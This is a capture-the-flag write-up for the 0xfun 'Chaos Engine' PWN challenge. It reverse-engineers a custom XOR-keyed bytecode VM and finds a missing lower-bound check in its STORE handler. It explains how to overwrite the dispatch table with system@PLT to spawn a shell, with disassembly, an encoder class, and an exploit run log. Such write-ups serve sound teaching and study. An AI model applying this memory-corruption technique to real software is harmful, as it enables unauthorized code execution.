# Chaos Engine - PWN Challenge

## Challenge Info
- **Name**: Chaos Engine
- **Category**: PWN (VM Exploitation)
- **Platform**: 0xfun CTF
- **Remote**: `nc chall.0xfun.org 46191`
- **Description**: "call4pwn... nah nah, this is not another 67 challenge, is more easier, not a difficult simple note taker."
- **Difficulty**: Easy (250 pts)
- **Flag**: `0xfun{l00k5_l1k3_ch479p7_c0uldn7_50lv3_7h15_0n3}`

> The flag reads "looks like chatgpt couldn't solve this one" in leet speak.

---

## Binary Analysis

```
$ file chaos
chaos: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked

$ checksec --file=chaos
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**No PIE** = all addresses are fixed (critical for the exploit).
**Full RELRO** = GOT is read-only, but the handler table in `.data` is still writable.

---

## Complete VM Reverse Engineering

### Phase 1: Initial Reconnaissance

```bash
$ strings chaos | grep -i chaos
--- CHAOS ENGINE ---

$ strings chaos | grep -i flag
# (nothing - no win function)

$ nm chaos | grep -i system
# (stripped, but system@PLT exists at 0x401090)
```

The binary is stripped but not PIE, so we can use r2 to map everything.

### Phase 2: Identifying the Program Structure

#### main() @ 0x40168f

```c
void main() {
    // Disable buffering
    setvbuf(stdout, NULL, 2, 0);
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stderr, NULL, 2, 0);

    // Initialize
    key = 0x55;           // @ 0x4052e8
    stop_flag = 1;        // @ 0x4052e9

    puts("--- CHAOS ENGINE ---");
    printf("Feed the chaos (Hex encoded): ");

    // Read input
    char input[0x401];
    memset(input, 0, 0x401);
    ssize_t n = read(0, input, 0x400);  // Max 1024 hex chars

    // Parse hex pairs
    counter = 0;  // @ 0x4052e0
    for (int i = 0; i < n/2; i++) {
        uint8_t byte;
        sscanf(&input[i*2], "%2x", &byte);
        bytecode[counter++] = byte;  // bytecode @ 0x4050e0
    }

    puts("Executing...");
    vm_loop();  // @ 0x401542
}
```

**Key finding**: Input is hex-encoded, max 1024 chars = 512 bytes of bytecode.

#### vm_loop() @ 0x401542

This is the VM core. Annotated disassembly:

```asm
vm_loop:
    jmp check_condition

fetch_decode:
    ; Fetch 3 bytes from bytecode, XOR each with key
    mov rax, [counter]           ; counter @ 0x4052e0
    movzx edx, byte [rax + bytecode]  ; raw byte 0
    movzx eax, byte [key]       ; key @ 0x4052e8
    xor eax, edx
    mov [b1], al                 ; b1 = raw[0] ^ key

    ; Same for bytes 1 and 2
    mov [b2], al                 ; b2 = raw[1] ^ key
    mov [b3], al                 ; b3 = raw[2] ^ key

    add [counter], 3             ; Advance counter

    ; Compute opcode = b1 % 7
    ; (compiler uses multiplication trick: mul by 0x25, shifts, sub)
    movzx edx, byte [b1]
    ; ... arithmetic sequence that computes edx % 7 ...
    mov [opcode], dl

    ; Load R[b2] as rdi argument
    movzx eax, byte [b2]
    cmp rax, 0      ; bounds check: 0 <= b2 <= 7
    js skip_load
    cmp rax, 7
    jg skip_load
    lea rdx, [rax*8]
    lea rax, [regs]              ; regs @ 0x4040a0
    mov rax, [rdx + rax]        ; rdi = regs[b2]
skip_load:

    ; Dispatch: call handler[opcode](rdi=R[b2], rsi=b3, rdx=b2)
    movzx eax, byte [opcode]
    cdqe
    lea rdx, [rax*8]
    lea rax, [handler_table]     ; handler_table @ 0x404020
    mov r8, [rdx + rax]         ; r8 = handler[opcode]
    mov rdi, rax                ; rdi = R[b2] value
    mov rsi, rcx                ; rsi = b3
    mov rdx, ...                ; rdx = b2
    call r8                     ; CALL handler!

    ; After handler: key += 0x13
    movzx eax, byte [key]
    add eax, 0x13
    mov byte [key], al

check_condition:
    movzx eax, byte [stop_flag]  ; stop_flag @ 0x4052e9
    test al, al
    je exit_loop
    mov rax, [counter]
    cmp rax, 0x1ff               ; counter <= 511
    jbe fetch_decode

exit_loop:
    ret
```

**Key findings**:
- 3 bytes per instruction, XOR'd with key
- `opcode = b1 % 7` → 7 possible opcodes (0-6)
- Dispatch via function pointer table at `0x404020`
- `key += 0x13` after each instruction
- Loop until `stop_flag == 0` or `counter > 0x1FF`

### Phase 3: Reverse Engineering Each Handler

#### Handler[0] - HALT @ 0x4011f5

```c
void halt(uint64_t rdi, uint64_t rsi, uint64_t rdx) {
    stop_flag = 0;                    // @ 0x4052e9 = 0
    puts("[!] System Halted.");
}
```

Simply sets `stop_flag = 0` to stop the VM loop.

#### Handler[1] - SET @ 0x401222

```c
void set(uint64_t rdi, uint64_t rsi_b3, uint64_t rdx_b2) {
    if (rdx_b2 >= 0 && rdx_b2 <= 7) {
        regs[rdx_b2] = rsi_b3;       // R[b2] = b3 (immediate value 0-255)
    }
}
```

Assigns an 8-bit immediate value to a register. Only allows indices 0-7.

#### Handler[2] - ADD @ 0x401260

```c
void add(uint64_t rdi, uint64_t rsi_b3, uint64_t rdx_b2) {
    if (rdx_b2 >= 0 && rdx_b2 <= 7 && rsi_b3 >= 0 && rsi_b3 <= 7) {
        uint64_t* dst = &regs[rdx_b2];
        uint64_t  src = regs[rsi_b3];
        *dst = *dst + src;            // R[b2] += R[b3]

        // Key feedback!
        key ^= (*dst & 0xFF);         // key ^= low byte of result
    }
}
```

**Crucial**: ADD modifies the key based on the result. This causes the key to evolve non-linearly and data-dependently.

#### Handler[3] - XOR @ 0x40130a

```c
void xor_handler(uint64_t rdi, uint64_t rsi_b3, uint64_t rdx_b2) {
    if (rdx_b2 >= 0 && rdx_b2 <= 7 && rsi_b3 >= 0 && rsi_b3 <= 7) {
        uint64_t* dst = &regs[rdx_b2];
        uint64_t  src = regs[rsi_b3];
        *dst = *dst ^ src;            // R[b2] ^= R[b3]

        key ^= (*dst & 0xFF);         // key ^= low byte of result
    }
}
```

Similar to ADD but with XOR. Also modifies the key.

#### Handler[4] - LOAD @ 0x4013b6

```c
void load(uint64_t rdi, uint64_t rsi_b3, uint64_t rdx_b2) {
    uint64_t addr = regs[rsi_b3];
    int64_t signed_addr = (int64_t)addr;

    if (signed_addr < 0 || signed_addr > 0xFFF) {
        puts("[!] Segfault (Read)");
        stop_flag = 0;
        return;
    }

    // MEM base = 0x4040a0 + 0x40 = 0x4040e0
    uint64_t val = *(uint64_t*)(0x4040e0 + addr);
    regs[rdx_b2] = val;              // R[b2] = MEM[R[b3]]
}
```

LOAD has a correct bounds check: **verifies both lower (< 0) and upper (> 0xFFF)**.

#### Handler[5] - STORE @ 0x401463 (VULNERABLE)

```c
void store(uint64_t rdi_val, uint64_t rsi_b3, uint64_t rdx_b2) {
    uint64_t addr = regs[rsi_b3];    // Note: b3 is the register index holding the address
    int64_t signed_addr = (int64_t)addr;  // movsxd rdx, eax → sign-extend!

    if (signed_addr <= 0xFFF) {       // ← BUG: does NOT check signed_addr >= 0!
        *(uint64_t*)(0x4040e0 + addr) = rdi_val;  // Write!
        key += 1;                     // key feedback
    } else {
        puts("[!] Segfault (Write)");
        stop_flag = 0;
    }
}
```

**THE VULNERABILITY**: Unlike LOAD which checks `addr >= 0 && addr <= 0xFFF`, STORE only checks `addr <= 0xFFF`. Negative values like `-0xC0` (which is `0xFFFFFFFFFFFFFF40` unsigned) pass the check because `-0xC0 <= 0xFFF` is TRUE.

Critical disassembly:
```asm
0x401493:  movsxd rdx, eax           ; Sign-extend 32-bit to 64-bit!
0x401496:  cmp    rdx, 0xfff         ; Only upper bound check
0x40149d:  jg     segfault_write     ; Jumps if addr > 0xFFF
; But does NOT jump if addr < 0 ← BUG
```

**Contrast with LOAD** (which IS correct):
```asm
; LOAD @ 0x4013b6:
0x4013e8:  cmp rax, 0         ; ← Check lower bound
0x4013ec:  js  segfault_read  ; ← If negative, segfault
0x4013f8:  cmp rax, 0xfff     ; Check upper bound
```

#### Handler[6] - DEBUG @ 0x4014f0

```c
void debug(uint64_t rdi, uint64_t rsi, uint64_t rdx) {
    if (rdi == 0xdeadc0de) {
        system("echo stub");         // Placeholder, not useful
    }
    printf("DEBUG: System @ %p\n", system);  // Leak of system address
}
```

Always prints the address of system. If rdi == 0xdeadc0de, executes `system("echo stub")`. This confirms that `system@PLT` is available in the binary.

### Phase 4: Complete Memory Map

```
0x404020 +0x00: handler[0] = 0x4011f5 (HALT)     ← TARGET: overwrite with system@PLT
0x404028 +0x08: handler[1] = 0x401222 (SET)
0x404030 +0x10: handler[2] = 0x401260 (ADD)
0x404038 +0x18: handler[3] = 0x40130a (XOR)
0x404040 +0x20: handler[4] = 0x4013b6 (LOAD)
0x404048 +0x28: handler[5] = 0x401463 (STORE)
0x404050 +0x30: handler[6] = 0x4014f0 (DEBUG)
...
0x4040a0: R[0] (register 0)
0x4040a8: R[1]
...
0x4040d8: R[7]
0x4040e0: DATA MEMORY BASE (used by LOAD/STORE)
...
0x4050e0: BYTECODE BUFFER (parsed input)
0x4052e0: counter (instruction pointer)
0x4052e8: key (XOR encryption key, 1 byte)
0x4052e9: stop_flag
```

**Critical offset**: `0x404020 - 0x4040e0 = -0xC0`

STORE writes to `0x4040e0 + R[addr_reg]`. If `R[addr_reg] = -0xC0 = 0xFFFFFFFFFFFFFF40`:
- `0x4040e0 + 0xFFFFFFFFFFFFFF40 = 0x404020` (handler[0]!)
- The check `signed_addr <= 0xFFF` passes because `-0xC0 <= 0xFFF`

---

## Exploitation

### Attack Plan

```
              BEFORE                              AFTER
handler[0] = 0x4011f5 (HALT)    →    handler[0] = 0x401090 (system@PLT)

Trigger: byte1=7 (7%7=0), byte2=4 → handler[0](rdi=R[4])
                                   → system(R[4])
                                   → system(0x4040e0)  // "sh" string
                                   → SHELL!
```

### Building 64-bit Values with 8-bit SET

Since SET can only load values 0-255, we need to build large values via repeated doubling (ADD R,R = shift left 1 bit) and additions:

**Example: building 0x401090 (system@PLT)**

```python
# Byte layout: 0x00_40_10_90
R[2] = 0x90                  # SET R2, 0x90
R[3] = 0x10                  # SET R3, 0x10
R[3] <<= 8  # via 8x double  # 8x ADD R3, R3 → R3 = 0x1000
R[2] += R[3]                 # ADD R2, R3 → R2 = 0x1090
R[3] = 0x40                  # SET R3, 0x40
R[3] <<= 16 # via 16x double # 16x ADD R3, R3 → R3 = 0x400000
R[2] += R[3]                 # ADD R2, R3 → R2 = 0x401090 ✓
```

**Example: building -0xC0 = 0xFFFFFFFFFFFFFF40**

```python
# Need 0x40 in byte 0, and 0xFF in bytes 1-7
R[0] = 0x40                  # SET R0, 0x40
R[1] = 0xFF                  # SET R1, 0xFF

# Iteration 1: R1 = 0xFF → 0xFF00 (shift left 8)
for _ in range(8): R[1] *= 2  # 8x ADD R1, R1
R[0] += R[1]                  # R0 = 0x40 + 0xFF00 = 0xFF40

# Iteration 2: R1 = 0xFF00 → 0xFF0000 (shift left 8 more)
for _ in range(8): R[1] *= 2
R[0] += R[1]                  # R0 = 0xFF40 + 0xFF0000 = 0xFFFF40

# ... repeat 5 more times ...
# Final: R0 = 0xFFFFFFFFFFFFFF40 = -0xC0 ✓
```

Total: 56 doublings + 7 additions + 2 SETs = 65 instructions just for -0xC0.

### The 6 Exploit Steps

| Step | Instructions | Result |
|------|-------------|--------|
| 1. Write "sh\0" | SET+8xADD+ADD+SET+STORE (13) | MEM[0x4040e0] = "sh\0" |
| 2. Build system@PLT | SET+SET+8xADD+ADD+SET+16xADD+ADD (29) | R[2] = 0x401090 |
| 3. Build -0xC0 | SET+SET+7×(8xADD+ADD) (65) | R[0] = 0xFFFFFFFFFFFFFF40 |
| 4. Overwrite handler[0] | STORE (1) | handler[0] = system@PLT |
| 5. Build "sh" addr | SET+SET+8xADD+ADD+SET+16xADD+ADD (29) | R[4] = 0x4040e0 |
| 6. Trigger | raw instruction (1) | system("sh") |
| **TOTAL** | **138 instructions** | **414 bytes / 828 hex chars** |

### XOR Key Tracking

The key evolves with each instruction. The `ChaosVM` class in `solve.py` replicates this behavior exactly:

```python
class ChaosVM:
    def __init__(self):
        self.regs = [0] * 8
        self.key = 0x55          # Initial key
        self.bytecode = bytearray()

    def _encode(self, b1, b2, b3):
        # XOR encrypt with current key
        self.bytecode.extend([b1 ^ self.key, b2 ^ self.key, b3 ^ self.key])

    def emit_SET(self, reg, val):
        self._encode(1, reg, val)
        self.regs[reg] = val
        self.key = (self.key + 0x13) & 0xFF   # key += 0x13

    def emit_ADD(self, dst, src):
        self._encode(2, dst, src)
        self.regs[dst] = (self.regs[dst] + self.regs[src]) & 0xFFFFFFFFFFFFFFFF
        self.key = (self.key ^ (self.regs[dst] & 0xFF)) & 0xFF  # key ^= result
        self.key = (self.key + 0x13) & 0xFF                      # key += 0x13

    def emit_STORE(self, val_reg, addr_reg):
        self._encode(5, val_reg, addr_reg)
        self.key = (self.key + 1) & 0xFF     # key += 1 (STORE specific!)
        self.key = (self.key + 0x13) & 0xFF  # key += 0x13
```

If the key drifts by **a single instruction**, all subsequent instructions decode incorrectly and the exploit fails silently.

---

## Running the Exploit

```
$ python3 solve.py REMOTE
[*] R0 should be 0xFFFFFFFFFFFFFF40 = 0xffffffffffffff40
[*] R2 (system@PLT) = 0x401090
[*] R4 (sh addr) = 0x4040e0
[*] Total instructions: 138
[*] Bytecode: 414 bytes, hex: 828 chars
[+] Opening connection to chall.0xfun.org on port 46191: Done
[+] Exploit sent! Shell spawned via system('sh')

$ cat /flag*
0xfun{l00k5_l1k3_ch479p7_c0uldn7_50lv3_7h15_0n3}
```

---

## Usage

```bash
python3 solve.py          # LOCAL
python3 solve.py REMOTE   # Against the remote server
python3 solve.py GDB      # With GDB attached (breakpoint at dispatch @ 0x40165b)
```

---

## Key Takeaways

1. **Asymmetric bounds check**: LOAD checks `addr >= 0 && addr <= 0xFFF` but STORE only checks `addr <= 0xFFF`. This type of bug is common in custom VMs — always compare the bounds checks of similar operations.

2. **Function pointer table in .data**: Although Full RELRO protects the GOT, the VM dispatch table lives in writable `.data`. Overwrite handler → code execution.

3. **XOR key as weak anti-tampering**: The key evolves with each instruction but is deterministic. Replicate the logic in Python → trivially reversible encryption.

4. **movsxd sign-extension**: The compiler uses `movsxd` to sign-extend offsets from 32 to 64 bits. Combined with a signed `<= 0xFFF` check, it allows negative values that point to memory before the buffer.

5. **system("sh") via pipe**: When testing with `echo payload | ./binary`, stdin closes and the shell dies immediately. Using pwntools keeps the fd open.

---

## Files

```
chaos_dir/
├── challenge/
│   └── chaos          # Target binary (ELF 64-bit, No PIE, Full RELRO)
├── exploit/
│   └── solve.py       # Complete exploit (ChaosVM encoder + pwntools sender)
├── writeup/
│   └── WRITEUP.md     # This writeup
└── flag.txt           # Captured flag
```
